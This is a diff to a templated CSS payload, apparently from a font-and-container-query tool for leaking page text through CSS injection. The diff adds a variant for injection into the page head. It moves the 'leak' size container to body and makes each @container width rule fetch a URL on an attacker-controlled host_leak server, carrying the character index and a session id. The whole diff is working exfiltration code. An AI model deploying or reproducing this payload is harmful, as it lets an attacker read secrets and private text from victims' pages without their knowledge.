@@ -20,11 +20,43 @@ html {
     top: 0 !important;
     left: 0 !important;
     display: grid !important;
+    {% if parent == "head" %}
+    grid-template-columns: auto 1fr;
+    {% else %}
     grid-template-columns: 1fr auto;
+    {% endif %}
     width: {{ html_width }}px !important;
     will-change: content, transform !important;
 }
 
+{% if parent == "head" %}
+head {
+    display: block !important;
+    width: auto !important;
+    height: auto !important;
+    position: static !important;
+}
+
+body {
+    display: block !important;
+    container-type: size !important;
+    container-name: leak;
+    height: 100% !important;
+    width: 100% !important;
+    max-width: {{ html_width }}px !important;
+    background: blue !important;
+}
+
+body::before {
+    display: block !important;
+    width: 0px !important;
+    height: 0px !important;
+    position: absolute !important;
+    top: 0 !important;
+    left: 0 !important;
+    content: "";
+}
+{% else %}
 head {
     display: block !important;
     container-type: size !important;
@@ -52,6 +84,7 @@ body {
     height: auto !important;
     position: static !important;
 }
+{% endif %}
 
 @font-face {
     font-family: 'fontleak';
@@ -98,7 +131,11 @@ body {
 
 {% for container in width_containers %}
 @container leak (width: {{ container.width }}px) {
+    {% if parent == "head" %}
+    body::before {
+    {% else %}
     head::before {
+    {% endif %}
         content: var(--a, var(--b, url("{{ host_leak }}/leak?idx={{ container.char_idx }}&sid={{ id }}")));
     }
 }
